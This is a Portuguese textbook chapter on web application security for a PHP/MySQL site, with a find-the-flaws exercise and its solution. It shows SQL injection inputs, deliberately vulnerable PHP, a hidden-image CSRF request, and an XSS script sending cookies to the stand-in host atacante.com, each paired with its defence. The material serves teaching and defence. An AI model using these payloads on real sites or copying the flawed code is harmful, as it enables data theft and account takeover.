Capítulo 9

Segurança em Aplicações Web

Antes da ligação à base de dados (Secção 8.4), o site da Contraponto só mostrava informação escrita no código. Com a base de dados, passou a receber texto de estranhos e a guardá-lo. Isto traz três responsabilidades: proteger os dados dos leitores e da equipa, impedir que alguém leia ou altere o que não é seu e manter o serviço a funcionar, com os dados íntegros. A segurança não é uma funcionalidade que se acrescenta no fim: acompanha cada linha de código escrita.

9.1 A Referência: OWASP Top 10

A referência mais usada para classificar vulnerabilidades de aplicações web é o OWASP Top 10, uma lista dos riscos de segurança mais críticos, publicada pelo Open Worldwide Application Security Project e atualizada periodicamente com base na análise de dados de vulnerabilidades reais (OWASP Foundation 2026). A edição mais recente é a de 2025. Este capítulo trata nove temas de segurança, que correspondem a seis categorias da lista:

As outras quatro categorias da lista (A06, A08, A09 e A10) não são tratadas neste capítulo.

9.2 Nunca Confiar nos Dados do Cliente

Numa aplicação web, o cliente (o browser) pede e mostra páginas, o servidor (o PHP) trata o pedido e monta a página, e a base de dados (o MySQL) guarda e devolve os dados. Um atacante atua sobre o primeiro elo: altera o que o cliente envia. Por isso, tudo o que chega do cliente ($_GET, $_POST, $_COOKIE) pode ter sido alterado, e até um pedido válido pode não ter sido intencional. É o princípio que atravessa todo o capítulo, e que dá origem a três ataques clássicos:

  • SQL Injection (A05): o dado chega à base de dados com um comando malicioso, que esta executa;
  • XSS (A05): o dado volta ao browser de outro utilizador com um código malicioso, que este executa;
  • CSRF (A01): o browser envia um pedido que parece do utilizador, com o cookie de sessão.

9.3 Vulnerabilidades no Próprio Código

As vulnerabilidades desta secção estão no código escrito pelo próprio programador, e cada uma tem uma defesa que se aplica no mesmo código.

9.3.1 SQL Injection

O SQL Injection ocorre quando o texto escrito pelo utilizador é colado numa instrução SQL, e o MySQL deixa de distinguir comando de valor (Secção 8.7). O dado traz então um comando malicioso, que a base de dados executa. Considere-se um delete.php que junta o id à instrução SQL, em vez de usar um ?:

<?php
$id = $_GET["id"];
$conexao->query("DELETE FROM artigos WHERE id = $id");

Com o pedido normal, delete.php?id=3, a instrução executada é DELETE FROM artigos WHERE id = 3, que apaga o artigo 3. Mas o atacante pode pedir delete.php?id=0 OR 1=1:

DELETE FROM artigos WHERE id = 0 OR 1=1

A expressão 1=1 é sempre verdadeira: com OR, a condição passa a ser verdadeira para todas as linhas, independentemente do id, e o DELETE apaga todos os artigos. O método query() não executa duas instruções no mesmo comando, por isso não é possível acrescentar, por exemplo, um DROP ou outro DELETE, mas alterar uma condição basta para fazer dano.

O mesmo mecanismo permite entrar numa área reservada sem conhecer a palavra-passe. Considere-se um formulário de autenticação implementado de forma insegura, por concatenação direta:

<?php
require "config.php";
$utilizador = $_POST["utilizador"];
$password = $_POST["password"];
$sql = "SELECT * FROM utilizadores WHERE "
     . "utilizador = '$utilizador' AND password = '$password'";
$resultado = $conexao->query($sql);
if ($linha = $resultado->fetch_assoc()) {
    echo "Sessão iniciada.";
}

Se um atacante escrever, no campo utilizador, o texto ' OR '1'='1' -- (com um espaço no fim do texto; sem ele, o MySQL dá um erro de sintaxe), a instrução SQL efetivamente executada passa a ser:

SELECT * FROM utilizadores
WHERE utilizador = '' OR '1'='1'
-- ' AND password = '...'

Como '1'='1' é sempre verdadeiro, e o -- transforma o resto da linha num comentário SQL, a palavra-passe nunca é verificada. A consulta devolve todas as linhas e o PHP usa a primeira, pelo que o atacante entra como o primeiro utilizador da tabela, sem conhecer nenhuma palavra-passe válida.

A defesa é a que se viu na Secção 8.7: usar sempre prepared statements. O comando segue com um ? no lugar dos valores, e os valores seguem à parte. O texto do atacante deixa de fazer parte do comando, e passa a ser apenas um valor a procurar, que não existe:

<?php
require "config.php";
$stmt = $conexao->prepare(
    "SELECT * FROM utilizadores
     WHERE utilizador = ? AND password = ?"
);
$stmt->bind_param("ss", $_POST["utilizador"], $_POST["password"]);
$stmt->execute();
$resultado = $stmt->get_result();
if ($linha = $resultado->fetch_assoc()) {
    echo "Sessão iniciada.";
} else {
    echo "Utilizador ou palavra-passe inválidos.";
}

Ninguém se chama ' OR '1'='1' --, por isso o login falha. Falta, no entanto, resolver um problema: a palavra-passe continua a ser comparada em texto simples (Secção 9.3.4).

9.3.2 XSS (Cross-Site Scripting)

O XSS (Cross-Site Scripting, em que a letra “X” se lê “Cross”) ocorre quando um texto escrito por um utilizador, com código malicioso inserido, é mostrado a outros utilizadores sem tratamento: o browser interpreta esse código e executa-o. O código do atacante corre assim dentro de outro site, o que foi atacado. Considere-se a página de comentários de um artigo, que mostra o texto submetido diretamente:

<?php
echo "<p>" . $_POST["comentario"] . "</p>";

Um comentário normal, como Muito bom!, aparece tal como foi escrito. Um comentário com <b>Muito bom!</b> aparece a negrito, porque o browser interpreta a etiqueta. E um comentário com um <script> não mostra nada, mas o código executa-se. O código inserido no texto tornou-se parte da página, e o browser não distingue o código do site do código inserido pelo visitante.

O ataque desenrola-se em cinco passos. O atacante escreve um comentário malicioso, por exemplo:

<script>
  document.location='http://atacante.com/roubo?c='+document.cookie
</script>

O site da Contraponto guarda-o e mostra-o. Quando um utilizador autenticado, como a Rita, gestora do site, abre a página, recebe-a com o <script> lá dentro, e o código executa-se no browser dela. O script envia o cookie de sessão deste site ao atacante, sem a Rita ver nada, e o atacante usa esse cookie para entrar no site como a Rita, com os privilégios dela (Secção 7.9.2). Note-se que o script só lê os cookies do próprio site: os de outros sites, como o banco, ficam fora do alcance.

A defesa é escapar sempre o texto vindo de utilizadores antes de o mostrar em HTML, com a função htmlspecialchars(). Esta função troca os carateres especiais do HTML (<, >, & e as aspas) por entidades inofensivas, e o browser mostra o texto em vez de o executar:

<?php
echo "<p>" . htmlspecialchars($_POST["comentario"]) . "</p>";

Por exemplo, o texto <script>alert(1)</script> é enviado ao browser como:

&lt;script&gt;alert(1)&lt;/script&gt;

O browser mostra o texto, não o executa. Desta forma, o texto do atacante é mostrado literalmente na página, como texto visível, e não interpretado como código. A regra é escapar sempre na saída: todo o texto vindo de utilizadores, antes de o mostrar em HTML.

9.3.3 CSRF (Cross-Site Request Forgery)

O CSRF (Cross-Site Request Forgery) é um pedido (request) forjado (forgery) a partir de outro site (cross-site). Ocorre quando um atacante induz o browser de um utilizador já autenticado a enviar, sem que este se aperceba, um pedido a uma aplicação onde tem sessão iniciada, explorando o facto de o browser enviar automaticamente os cookies de sessão em qualquer pedido a esse domínio, tal como visto na Secção 7.9.1. O site atacado recebe um pedido que parece da Rita, mas foi a página do atacante que o fez enviar.

Imagine-se o delete.php da Secção 8.9, em que, para apagar um registo, basta o browser da Rita (autenticada no site da Contraponto) pedir este endereço:

GET /delete.php?id=3

Se a página do atacante tiver, no seu HTML, uma “imagem” invisível para a Rita (width="0", height="0"), em que o src, que deveria ser o endereço de uma imagem, contém o endereço do delete.php:

<img src="https://contraponto.example/delete.php?id=3" width="0" height="0">

então, quando a Rita visita essa página, o browser envia o pedido ao carregar a “imagem” e junta o cookie de sessão sozinho: é um GET que apaga dados. O delete.php vê uma sessão válida e apaga o artigo 3, sem que a Rita tenha clicado em nada. O atacante nunca vê o cookie (ao contrário do XSS, em que o rouba): usa o browser da Rita para enviar o pedido.

A defesa tem duas partes, complementares. A primeira é nunca alterar dados por GET, tal como já recomendado na Secção 7.4.3 (o GET lê, o POST altera). A segunda é pôr, em cada formulário sensível, um token imprevisível, guardado na sessão e verificado antes de agir. O formulário gera o token e envia-o num campo escondido:

<?php
session_start();
if (empty($_SESSION["token"])) {
    $_SESSION["token"] = bin2hex(random_bytes(32));
}
?>
<form action="delete.php" method="post">
  <input type="hidden" name="id" value="3">
  <input type="hidden" name="token"
         value="<?= $_SESSION["token"] ?>">
  <button>Apagar</button>
</form>

A função random_bytes(32) gera valores imprevisíveis, bin2hex() converte-os em texto e hash_equals() compara os dois tokens. O delete.php recusa o pedido se o token não existir ou não coincidir:

<?php
session_start();
if (!isset($_SESSION["token"], $_POST["token"])
    || !hash_equals($_SESSION["token"],
                    $_POST["token"])) {
    http_response_code(403);
    exit("Pedido inválido.");
}
// token certo: apagar com prepared statement

O if lê-se peça a peça:

  1. !isset($_SESSION["token"], $_POST["token"]): o ! é «não», por isso a condição é verdadeira se faltar um dos dois tokens;
  2. || é «ou»: basta uma das condições ser verdadeira para recusar. Se a primeira for verdadeira, a segunda nem chega a ser avaliada, o que garante que o hash_equals() nunca recebe um valor em falta;
  3. !hash_equals(...): verdadeira se os dois tokens forem diferentes;
  4. { ... }: responde com o código 403 e o exit termina o script.

A página do atacante não conhece o token: o browser não a deixa ler a página da Contraponto (a política same-origin), por isso não o consegue incluir no pedido.

9.3.4 Palavras-passe em Texto Simples

Se as palavras-passe forem guardadas tal como foram escritas, o que o atacante vê, se roubar a tabela utilizadores, é isto:

Um SQL Injection, um erro de configuração ou uma cópia de segurança roubada expõem a tabela inteira. O atacante fica com a palavra-passe de cada pessoa, e as pessoas repetem palavras-passe noutros serviços. Até quem administra o site consegue ler as palavras-passe dos utilizadores. É assim que compara o login da Secção 9.3.1, e por isso a palavra-passe nunca deve ser guardada: guarda-se uma espécie de impressão digital dela.

O hash

Um hash é o resultado de uma função que transforma a palavra-passe num valor de tamanho fixo. Identifica-a, mas não permite reconstruí-la: do hash não se recupera a palavra-passe, só se adivinha, por tentativas. Na base de dados guarda-se só o hash, e a palavra-passe verdadeira nunca é guardada. No login, o PHP verifica se o que a pessoa escreveu como palavra-passe corresponde ao hash guardado.

O PHP tem duas funções para isto. Ao registar, password_hash() cria o hash, e ao entrar, password_verify() verifica-o:

<?php
$hash = password_hash(
    $_POST["password"], PASSWORD_DEFAULT
);
<?php
// $hash vem da base de dados
if (password_verify(
        $_POST["password"], $hash)) {
    // palavra-passe certa
}

Duas execuções de password_hash() com a mesma palavra-passe dão resultados diferentes, por exemplo:

$2y$12$BpqtsRr5RdRVkRxTwYNZr.xd21tabzoCdzCgglor5pk9Ilryp9Xt2
$2y$12$JN664fXU3AqFVrjy2BYRruHKFpVmDZnHpk4rHlZTo5mSHGVvCrjnC

É normal. O PHP junta um valor aleatório, o salt, à palavra-passe antes de calcular, e o mesmo texto nunca dá o mesmo hash: duas pessoas com a mesma palavra-passe ficam com hashes diferentes. O password_verify() lê o salt dentro do hash guardado e repete o cálculo.

Cada hash ocupa 60 carateres e já inclui o algoritmo e o salt. A constante PASSWORD_DEFAULT escolhe o algoritmo recomendado (hoje, o bcrypt) e pode mudar, por isso a coluna password passa a VARCHAR(255). Uma palavra-passe fraca, como 12345678, continua a ser descoberta: o hash protege a tabela, não as más escolhas.

Registo e login

O registo.php guarda só o hash, e o login.php pesquisa só pelo utilizador:

<?php
require "config.php";
$utilizador = $_POST["utilizador"];
$hash = password_hash($_POST["password"],
                      PASSWORD_DEFAULT);
$stmt = $conexao->prepare(
    "INSERT INTO utilizadores
     (utilizador, password) VALUES (?, ?)"
);
$stmt->bind_param("ss", $utilizador, $hash);
$stmt->execute();
<?php
require "config.php";
$stmt = $conexao->prepare(
    "SELECT password FROM utilizadores
     WHERE utilizador = ?"
);
$stmt->bind_param("s", $_POST["utilizador"]);
$stmt->execute();
$resultado = $stmt->get_result();
$linha = $resultado->fetch_assoc();
if ($linha && password_verify($_POST["password"],
                              $linha["password"])) {
    session_start();
    $_SESSION["utilizador"] = $_POST["utilizador"];
    header("Location: painel.php");
} else {
    echo "Utilizador ou palavra-passe inválidos.";
}

Este login difere do da secção sobre SQL Injection em quatro pontos:

  1. O registo guarda só o hash;
  2. O login pesquisa só pelo utilizador: a palavra-passe nunca entra na SQL;
  3. Se o utilizador não existe, o $linha && evita verificar a palavra-passe;
  4. A mensagem de erro não diz se falhou o utilizador ou a palavra-passe, para não revelar a um atacante que um dado nome de utilizador existe.

9.4 Vulnerabilidades em Dependências de Terceiros

A superfície de ataque de um site não se limita ao código escrito diretamente pelo seu programador. Grande parte dos sites atuais é construída sobre sistemas de gestão de conteúdos, como o WordPress, estendidos através de extensões (plugins) desenvolvidas por terceiros, muitas vezes por equipas muito pequenas ou até um único programador independente. Segundo o relatório State of WordPress Security in 2026, da Patchstack, 91% das novas vulnerabilidades do ecossistema WordPress em 2025 estavam em plugins e 9% em temas; o núcleo do WordPress teve apenas 6, em mais de 11 000 (11 334), todas de baixa prioridade (Patchstack 2026).

Esta realidade levou a atualização mais recente do OWASP Top 10 a manter uma categoria dedicada a falhas na cadeia de fornecimento de software (Software Supply Chain Failures, A03), reconhecendo que a segurança de uma aplicação depende também da segurança de todas as bibliotecas, frameworks e extensões de que esta depende, e não apenas do código escrito pela própria equipa (OWASP Foundation 2026). Uma biblioteca pode, além disso, depender de outra vulnerável (as dependências transitivas): é o caso do Log4Shell (2021), uma falha numa biblioteca de logging presente em milhares de aplicações. A falha pode estar em código que o dono do site nunca escreveu, mas o risco que representa é igualmente real.

No caso da Contraponto, o site não usa bibliotecas de terceiros, mas corre sobre software de terceiros, o servidor web e o MySQL, que também têm falhas.

9.5 Boas Práticas

Algumas práticas simples reduzem significativamente o risco de segurança de uma aplicação web.

9.5.1 Atualizações regulares

Muitas falhas só são exploradas depois de se tornarem públicas, e o intervalo entre a divulgação e a exploração pode ser muito curto. Convém manter atualizados o PHP, o servidor web e o MySQL (as versões antigas deixam de receber correções, e as suas falhas ficam públicas e documentadas) e os plugins e temas, instalando só os necessários, de fontes fiáveis, e removendo os que já não se usam. Consultar a versão é o primeiro passo para saber se há correções por aplicar:

php -v           # versão do PHP
mysql --version  # versão do MySQL

Atualizar não é só correr um comando: convém testar primeiro e ter uma cópia de segurança, porque uma atualização também pode falhar.

9.5.2 Princípio do menor privilégio

Cada componente de uma aplicação, e cada utilizador da base de dados, deve ter apenas as permissões de que precisa, nunca acesso total por comodidade. Com os comandos de controlo de permissões do SQL (Secção 8.2), cria-se um utilizador só para a aplicação:

-- cria o utilizador que a aplicação usa
CREATE USER 'contraponto_app'@'localhost'
    IDENTIFIED BY 'palavra-passe-forte';

-- só estas operações, só nesta base de dados
GRANT SELECT, INSERT, UPDATE, DELETE
    ON contraponto.* TO 'contraponto_app'@'localhost';

Esta conta não pode apagar tabelas, alterar a estrutura (DROP, ALTER, CREATE) nem aceder a outras bases de dados. Continua, porém, a poder ler e alterar os dados da Contraponto: o menor privilégio limita o dano, não impede o ataque. Usar o utilizador root numa aplicação web é uma má prática grave: com um SQL Injection, o atacante teria acesso total ao servidor de base de dados. O mesmo princípio aplica-se aos ficheiros: o servidor web só deve poder escrever nas pastas de que precisa (por exemplo, a dos ficheiros enviados), nunca no código PHP.

9.5.3 Validar e escapar os dados

Todo o dado vindo de fora ($_GET, $_POST, $_COOKIE, cabeçalhos HTTP) é tratado como não confiável. A validação verifica se o dado tem o formato esperado, como um texto não vazio, um número ou uma data:

<?php
if (!isset($_POST["comentario"])
    || $_POST["comentario"] === "") {
    exit("Escreve um comentário.");
}

O escape torna o dado seguro para o contexto em que vai ser usado:

Validar não substitui escapar: um comentário não vazio passa na validação e pode conter <script>. E a validação feita no browser não protege, porque um atacante envia o pedido sem passar pelo formulário.

9.5.4 Não mostrar erros em produção

Durante o desenvolvimento, display_errors ajuda a descobrir o que falha (Secção 8.8). Num site em produção, a mesma mensagem ajuda o atacante: revela nomes de tabelas, de ficheiros e de utilizadores. A configuração de desenvolvimento mostra os erros no ecrã; a de produção regista-os sem os mostrar:

<?php
// desenvolvimento
error_reporting(E_ALL);
ini_set("display_errors", 1);
<?php
// produção
error_reporting(E_ALL);
ini_set("display_errors", 0);
ini_set("log_errors", 1);

Um visitante poderia ler, por exemplo, Access denied for user 'utilizador'@'localhost', que revela o nome do utilizador da base de dados, ou You have an error in your SQL syntax, que confirma que a sua entrada chegou à consulta (SQL Injection). Em produção, os erros continuam a ser todos registados, mas vão para o registo de erros do servidor, que só a equipa lê. Na prática, estas opções definem-se no php.ini, a configuração do PHP no servidor, e não em cada página.

9.6 Desafio: Encontrar as Falhas

O Tiago vai implementar o painel de administração da Contraponto. Cada requisito da Rita traduz-se em ameaças e defesas deste capítulo:

O Tiago escreveu a primeira versão de dois ficheiros. Há seis falhas deste capítulo: o desafio é encontrá-las e corrigi-las.

<?php
// login.php
require "config.php";
$u = $_POST["utilizador"];
$p = $_POST["password"];
$r = $conexao->query("SELECT * FROM utilizadores
    WHERE utilizador = '$u' AND password = '$p'");
if ($r->fetch_assoc()) {
    session_start();
    $_SESSION["utilizador"] = $u;
    echo "Sessão iniciada.";
}
<?php
// comentarios.php
require "config.php";
$c = $_GET["apagar"];
$conexao->query("DELETE FROM comentarios
                WHERE id = $c");
$r = $conexao->query("SELECT texto FROM comentarios");
while ($linha = $r->fetch_assoc()) {
    echo "<p>" . $linha["texto"] . "</p>";
}

O desafio tem três passos:

  1. Dizer que ataque cada falha permite;
  2. Reescrever os dois ficheiros com a defesa adequada (Secção 9.3.1, Secção 9.3.2, Secção 9.3.3 e Secção 9.3.4);
  3. Acrescentar a página de registo, com password_hash().

9.6.1 Os ficheiros corrigidos

As seis falhas e as suas correções estão assinaladas por números nos comentários dos ficheiros corrigidos:

<?php
// login.php
require "config.php";
$u = $_POST["utilizador"];
$p = $_POST["password"];
$stmt = $conexao->prepare(  // 1
    "SELECT password FROM utilizadores
     WHERE utilizador = ?");
$stmt->bind_param("s", $u);
$stmt->execute();
$linha = $stmt->get_result()->fetch_assoc();
if ($linha &&
    password_verify($p, $linha["password"])) {  // 2
    session_start();
    $_SESSION["utilizador"] = $u;
    echo "Sessão iniciada.";
}
<?php
// comentarios.php
require "config.php";
session_start();
if (!isset($_SESSION["utilizador"])) {  // 5
    exit("Acesso negado.");
}
if (isset($_SESSION["token"], $_POST["apagar"],  // 3
        $_POST["token"])
    && hash_equals($_SESSION["token"], $_POST["token"])) {
    $stmt = $conexao->prepare(  // 4
        "DELETE FROM comentarios WHERE id = ?");
    $stmt->bind_param("i", $_POST["apagar"]);
    $stmt->execute();
}
$r = $conexao->query("SELECT texto FROM comentarios");
while ($linha = $r->fetch_assoc()) {
    echo "<p>" .
         htmlspecialchars($linha["texto"]) . "</p>";  // 6
}
  1. SQL Injection no login: prepared statements;
  2. palavra-passe em texto simples: password_verify() sobre o hash (o registo está na Secção 9.3.4.2);
  3. CSRF: apagar por POST, com token, em vez de GET (o formulário com o token é o da Secção 9.3.3);
  4. SQL Injection no DELETE: prepared statement;
  5. falta de verificação da sessão: só quem entrou pode apagar;
  6. XSS: htmlspecialchars() ao mostrar os comentários.
